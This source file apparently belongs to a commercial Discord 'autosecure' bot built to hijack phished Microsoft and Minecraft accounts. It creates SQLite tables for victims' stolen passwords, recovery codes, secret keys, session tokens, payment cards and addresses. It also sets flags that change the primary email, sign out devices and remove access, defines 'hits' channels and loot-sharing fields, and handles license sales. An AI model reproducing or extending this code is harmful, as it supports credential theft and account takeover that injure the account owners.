const sqlite = require("sqlite3").verbose();
const { join } = require("path");
const path = join(__dirname, "database.db");
const config = require("../config.json");
const { getnewkey } = require("../autosecure/utils/hypixelapi/getnewkey.js");
const { queryParams, db } = require("./database.js");


const queries = {
  secureconfig: `CREATE TABLE IF NOT EXISTS secureconfig(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id TEXT,
    exploit INTEGER DEFAULT 1,
    auto_secure INTEGER DEFAULT 1,
    change_ign INTEGER DEFAULT 0,
    multiplayer INTEGER DEFAULT 0,
    oauthapps INTEGER DEFAULT 1,
    removedevices INTEGER DEFAULT 0,
    changegamertag INTEGER DEFAULT 0,
    signout INTEGER DEFAULT 1,
    autoquarantine INTEGER DEFAULT 0,
    checkban INTEGER DEFAULT 0,
    changeprimary INTEGER DEFAULT 1,
    secureifnomc INTEGER DEFAULT 1,
    addzyger INTEGER DEFAULT 0,
    subscribemail INTEGER DEFAULT 0,
    changedob INTEGER DEFAULT 0,
    changename INTEGER DEFAULT 0,
    changepfp INTEGER DEFAULT 0,
    changelanguage INTEGER DEFAULT 0,
    language TEXT,
    prefix TEXT DEFAULT "old",
    aliasPrefix TEXT DEFAULT "",
    dob TEXT,
    name TEXT,
    pfp TEXT DEFAULT '${config.defaultpfp}',
    domain TEXT DEFAULT '${config.domains[0]}'
  )`,

  notifications: `CREATE TABLE IF NOT EXISTS notifications(
    id TEXT PRIMARY KEY,
    userid TEXT,
    time INTEGER,
    checked INTEGER DEFAULT 0
  )`,

  settings: `CREATE TABLE IF NOT EXISTS settings(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id TEXT,
    hidenonmc NUMBER DEFAULT 0,
    showleaderboard NUMBER DEFAULT 1,
    sortingtype TEXT DEFAULT 'time_desc',
    encodedpassword TEXT
  )`,

  autosecure: `CREATE TABLE IF NOT EXISTS autosecure (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    botnumber INTEGER DEFAULT 1,
    lastsavedname TEXT,
    postserver TEXT,
    creationdate INTEGER,
    server_id TEXT,
    token TEXT,
    user_id TEXT,
    prefix TEXT DEFAULT "old",
    aftersecure TEXT DEFAULT 'nothing',
    blacklistemails INTEGER DEFAULT 1,
    ping TEXT DEFAULT '@everyone',
    exploit INTEGER DEFAULT 1,
    webhook TEXT,
    auto_secure INTEGER DEFAULT 1,
    change_ign INTEGER DEFAULT 0,
    multiplayer INTEGER DEFAULT 0,
    oauthapps INTEGER DEFAULT 1,
    removedevices INTEGER DEFAULT 0,
    changegamertag INTEGER DEFAULT 0,
    signout INTEGER DEFAULT 1,
    autoquarantine INTEGER DEFAULT 0,
    checkban INTEGER DEFAULT 0,
    claiming INTEGER DEFAULT 0,
    changeprimary INTEGER DEFAULT 1,
    changedob INTEGER DEFAULT 0,
    changename INTEGER DEFAULT 0,
    changepfp INTEGER DEFAULT 0,
    changelanguage INTEGER DEFAULT 0,
    secureifnomc INTEGER DEFAULT 1,
    addzyger INTEGER DEFAULT 0,
    subscribemail INTEGER DEFAULT 0,
    validateusername INTEGER DEFAULT 1,
    dob TEXT,
    name TEXT,
    pfp TEXT DEFAULT '${config.defaultpfp}',
    language TEXT,
    verifymsg TEXT,
    oauth_link TEXT,
    logs_channel TEXT,
    notification_channel TEXT,
    hits_channel TEXT,
    allhits_channel TEXT,
    users_channel TEXT,
    activity TEXT,
    domain TEXT DEFAULT '${config.domains[0]}',
    verification_type NUMBER DEFAULT 0
  )`,

  profiles: `CREATE TABLE IF NOT EXISTS profiles(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    botnumber INTEGER DEFAULT 1,
    user_id TEXT,
    embed TEXT
  )`,

  embeds: `CREATE TABLE IF NOT EXISTS embeds(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    botnumber INTEGER DEFAULT 1,
    user_id TEXT,
    type TEXT,
    embed TEXT
  )`,

  modals: `CREATE TABLE IF NOT EXISTS modals(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    botnumber INTEGER DEFAULT 1,
    user_id TEXT,
    type TEXT,
    modal TEXT
  )`,

  buttons: `CREATE TABLE IF NOT EXISTS buttons(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    botnumber INTEGER DEFAULT 1,
    user_id TEXT,
    type TEXT,
    button TEXT
  )`,

  presets: `CREATE TABLE IF NOT EXISTS presets(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    botnumber INTEGER DEFAULT 1,
    user_id TEXT,
    name TEXT,
    preset TEXT,
    buttonlabel TEXT,
    buttonlink TEXT,
    time INTEGER
  )`,

  users: `CREATE TABLE IF NOT EXISTS users(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    botnumber INTEGER DEFAULT 1,
    user_id TEXT,
    child TEXT,
    claiming NUMBER DEFAULT 1,
    usedmbuttons NUMBER DEFAULT 0,
    editclaiming NUMBER DEFAULT 0,
    editbuttons NUMBER DEFAULT 0,
    editbot NUMBER DEFAULT 0,
    editmodals NUMBER DEFAULT 0,
    editembeds NUMBER DEFAULT 0,
    editautosecure NUMBER DEFAULT 0,
    editphisher NUMBER DEFAULT 0,
    editpresets NUMBER DEFAULT 0,
    editblacklist NUMBER DEFAULT 0,
    usestatsbutton NUMBER DEFAULT 0,
    sendembeds NUMBER DEFAULT 0,
    claimedamount NUMBER DEFAULT 0,
    claimstreak NUMBER DEFAULT 0,
    split NUMBER DEFAULT 1,
    rest NUMBER DEFAULT 0,
    addedby TEXT,
    addedtime TEXT
  )`,

  blacklisted: `CREATE TABLE IF NOT EXISTS blacklisted(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    botnumber INTEGER DEFAULT 1,
    client_id TEXT,
    user_id TEXT
  )`,

  blacklistedemails: `CREATE TABLE IF NOT EXISTS blacklistedemails(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    botnumber INTEGER DEFAULT 1,
    client_id TEXT,
    email TEXT
  )`,

  unclaimed: `CREATE TABLE IF NOT EXISTS unclaimed(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    botnumber INTEGER DEFAULT 1,
    user_id TEXT,
    username TEXT,
    date INTEGER,
    data TEXT
  )`,

  slots: `CREATE TABLE IF NOT EXISTS slots(
    user_id TEXT PRIMARY KEY,
    slots INTEGER
  )`,

  unusedslots: `CREATE TABLE IF NOT EXISTS unusedslots(
    unusedslots TEXT PRIMARY KEY
  )`,

  trial: `CREATE TABLE IF NOT EXISTS trial(
    user_id TEXT PRIMARY KEY,
    trial TEXT
  )`,

  email_notifier: `CREATE TABLE IF NOT EXISTS email_notifier(
    user_id TEXT,
    email TEXT
  )`,

  registeredemails: `CREATE TABLE IF NOT EXISTS registeredemails(
    user_id TEXT,
    email TEXT
  )`,

  quarantine: `CREATE TABLE IF NOT EXISTS quarantine(
    id TEXT PRIMARY KEY,
    user_id TEXT,
    ssid TEXT,
    uuid TEXT,
    name TEXT,
    time TEXT
  )`,

  proxies: `CREATE TABLE IF NOT EXISTS proxies(
    user_id TEXT,
    proxy TEXT
  )`,

  
accountsbyuser: `CREATE TABLE IF NOT EXISTS accountsbyuser(
  user_id TEXT,
  uid TEXT,
  time TEXT,
  claimed INTEGER DEFAULT 0
)`,


  usedLicenses: `CREATE TABLE IF NOT EXISTS usedLicenses(
    license TEXT UNIQUE,
    user_id TEXT,
    expiry TEXT,
    one_day_warning_sent INTEGER DEFAULT 0,
    seven_day_warning_sent INTEGER DEFAULT 0,
    istrial INTEGER DEFAULT 0 
  )`,

  emails: `CREATE TABLE IF NOT EXISTS emails(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sender TEXT,
    receiver TEXT,
    subject TEXT,
    description TEXT,
    time TEXT,
    ip TEXT
  )`,

  licenses: `CREATE TABLE IF NOT EXISTS licenses(
    license TEXT UNIQUE,
    duration TEXT
  )`,

  autosecureblacklist: `CREATE TABLE IF NOT EXISTS autosecureblacklist(
    user_id TEXT UNIQUE,
    reason TEXT 
  )`,

  apikey: `CREATE TABLE IF NOT EXISTS apikey (
  id INTEGER,
  apikey TEXT,
  status INTEGER DEFAULT 0,
  time TEXT
)`,

  stats: `CREATE TABLE IF NOT EXISTS stats(
    name TEXT PRIMARY KEY,
    stats TEXT,
    last_updated INTEGER
  )`,

  cosmetics: `CREATE TABLE IF NOT EXISTS cosmetics(
    name TEXT PRIMARY KEY,
    cosmetics TEXT,
    last_updated INTEGER
  )`,

  actions: `CREATE TABLE IF NOT EXISTS actions(
    id INTEGER,
    action TEXT
  )`,

  controlbot: `CREATE TABLE IF NOT EXISTS controlbot(
    id INTEGER PRIMARY KEY,
    activity_type TEXT,
    activity_name TEXT,
    leaderboardid TEXT,
    status TEXT,
    channelsent TEXT,
    message_id TEXT,
    version REAL DEFAULT 1.0,
    ticketcount INTEGER DEFAULT 0,
    proxy TEXT
  )`,

  status: `CREATE TABLE IF NOT EXISTS status(
    uid TEXT PRIMARY KEY,
    msauth TEXT,
    username TEXT,
    recoverycode TEXT,
    secretkey TEXT,
    email TEXT,
    secemail TEXT,
    password TEXT,
    multiplayer TEXT,
    oauths TEXT
  )`,

  extrainformation: `CREATE TABLE IF NOT EXISTS extrainformation(
    uid TEXT PRIMARY KEY,
    ip TEXT,
    mspoints TEXT,
    family TEXT,
    leftfamily TEXT,
    gtg TEXT,
    signout TEXT,
    exploit TEXT,
    oauthsafter TEXT,
    oauthsbefore TEXT,
    devices TEXT,
    ogo TEXT,
    purchases TEXT,
    cards TEXT,
    subscriptions TEXT,
    newinfo TEXT,
    newpfp TEXT,
    newgamertag TEXT,
    security TEXT,
    oldaliases TEXT,
    newaliases TEXT,
    addresses TEXT,
    multiplayer TEXT,
    apppasswords TEXT,
    devicestatus TEXT,
    msbalance TEXT,
    xblrefresh TEXT,
    creationdate TEXT,
    changedusername TEXT,
    hasmc TEXT,
    namechange TEXT,
    mcitems TEXT,
    playstation TEXT,
    minecoin TEXT,
    ssid TEXT,
    capes TEXT,
    lunar TEXT,
    username TEXT
  )`,

  accounts: `CREATE TABLE IF NOT EXISTS accounts(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    uid TEXT UNIQUE,
    user_id TEXT,
    username TEXT,
    ownsmc TEXT,
    capes TEXT,
    email TEXT,
    recoverycode TEXT,
    secemail TEXT,
    secretkey TEXT,
    password TEXT,
    stats_id TEXT,
    time TEXT
  )`,

  leaderboard: `CREATE TABLE IF NOT EXISTS leaderboard(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id TEXT,
    networth INTEGER,
    amount INTEGER
  )`,
  unappealed: `CREATE TABLE IF NOT EXISTS unappealed(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id TEXT,
    ssid TEXT
  )`,
  finishedappeal: `CREATE TABLE IF NOT EXISTS finishedappeal(
    id TEXT,
    data TEXT
  )`
};


function scheduleAction(time, action) {
  const delay = time - Date.now();
  if (delay > 0) {
    setTimeout(action, delay);
  } else {
    action();
  }
}






async function checkApiKey() {
  const { haslifetimekey } = require('./getkey.js');
  let haskey = await haslifetimekey();
  
  if (haskey) {
    console.log('Has lifetime key! Not generating a new key!');
    scheduleAction(Date.now() + 3600000, checkApiKey);
    return;
  }

  try {
    const results = await queryParams("SELECT apikey, time FROM apikey WHERE id = ?", [1]);
    if (results.length === 0) {
      // No key
      console.log("No API key found. Generating a new one...");
      await getnewkey(queryParams, 'temporary');
    } else {
      const { time: timefromdbRaw } = results[0];
      const timewith15m = Number(timefromdbRaw) - 900 * 1000;
      const timenow = Date.now();
      if (Number(timefromdbRaw) < timenow) {
        console.log("API key expired. Refreshing...");
        await getnewkey(queryParams, 'temporary');
      } else if (timewith15m > timenow) {
        console.log(`API key valid. Scheduling refresh for ${new Date(timewith15m).toLocaleString()}`);
        scheduleAction(timewith15m, checkApiKey);
      } else {
        console.log("API key is close to expiring. Refreshing...");
        await getnewkey(queryParams, 'temporary');
      }
    }



    scheduleAction(Date.now() + 3600000, checkApiKey);
  } catch (err) {
    console.error("Error checking API key:", err);
    scheduleAction(Date.now() + 900000, checkApiKey);
  }
}

async function initializeDB() {
  for (let query of Object.values(queries)) {
    try {
      await new Promise((resolve, reject) => {
        db.run(query, [], (err) => {
          if (err) {
            console.log(err.message);
            reject(err);
          } else {
            resolve();
          }
        });
      });
    } catch (err) {
      console.error("Error running query:", err);
      return false
    }
  }
  return true
}

async function createapikey() {
  try {
  const apikey = await queryParams(`SELECT * FROM apikey WHERE id = ?`, [1]);

  if (apikey && apikey.length > 0) {
    return;
  } else {
    await queryParams(
      `INSERT INTO apikey (id, apikey, status, time) VALUES (?, ?, ?, ?)`,
      [1, null, 0, null]
    );
  }
  } catch (error){
    console.log(`Createapikey error: ${error}`)
  }

}


async function createcontrolbot() {
  try {
    const controlbot = await queryParams(`SELECT * FROM controlbot WHERE id = ?`, [1]);
    if (controlbot && controlbot.length > 0) {
      return;
    } else {
      await queryParams(`INSERT INTO controlbot (id) VALUES (?)`, [1]);
    }
  } catch (error) {
    console.log(`Create controlbot error: ${error}`);
  }
}





async function addAllHitsChannel() {
  try {
    await new Promise((resolve, reject) => {
      db.run(`ALTER TABLE autosecure ADD COLUMN allhits_channel TEXT`, (err) => {
        if (err && !err.message.includes('duplicate column name')) {
          console.error('Error adding allhits_channel column:', err.message);
          reject(err);
        } else {
          resolve();
        }
      });
    });
  } catch (error) {
    if (!error.message.includes('duplicate column name')) {
      console.error('Error in addAllHitsChannel:', error);
    }
  }
}

async function addAliasPrefix() {
  try {
    await new Promise((resolve, reject) => {
      db.run(`ALTER TABLE secureconfig ADD COLUMN aliasPrefix TEXT DEFAULT ""`, (err) => {
        if (err && !err.message.includes('duplicate column name')) {
          console.error('Error adding aliasPrefix column:', err.message);
          reject(err);
        } else {
          resolve();
        }
      });
    });
  } catch (error) {
    if (!error.message.includes('duplicate column name')) {
      console.error('Error in addAliasPrefix:', error);
    }
  }
}

async function startup() {
  await initializeDB();  
  await addAllHitsChannel();
  await addAliasPrefix();
  await createcontrolbot()
  await createapikey()
  await checkApiKey();
  console.log("Database ready.");
}

startup()


module.exports = { 
  initializeDB, 
  queryParams, 
  checkApiKey
};